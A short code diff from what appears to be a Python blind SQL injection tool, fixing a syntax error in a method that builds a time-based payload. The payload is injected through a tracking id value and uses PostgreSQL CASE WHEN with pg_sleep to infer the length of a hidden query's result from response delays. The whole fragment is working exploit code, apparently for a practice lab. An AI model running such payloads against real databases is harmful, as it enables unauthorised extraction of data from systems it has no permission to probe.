@@ -27,8 +27,9 @@ class MySQLi(SQLi):
         self.session_token = session_token
     def format_length_query(self, inner_query, length):
         return (
-            f"{self.tracking_id}'||(SELECT CASE WHEN ((select length(({inner_query})))={length}"
-            f"=) THEN pg_sleep({SLEEP}) ELSE pg_sleep(0) END)--"
+            f"{self.tracking_id}'||(SELECT CASE WHEN ("
+            f"(select length(({inner_query})))={length}"
+            f") THEN pg_sleep({SLEEP}) ELSE pg_sleep(0) END)--"
         )
         
     def format_char_query(self, inner_query, index, char):
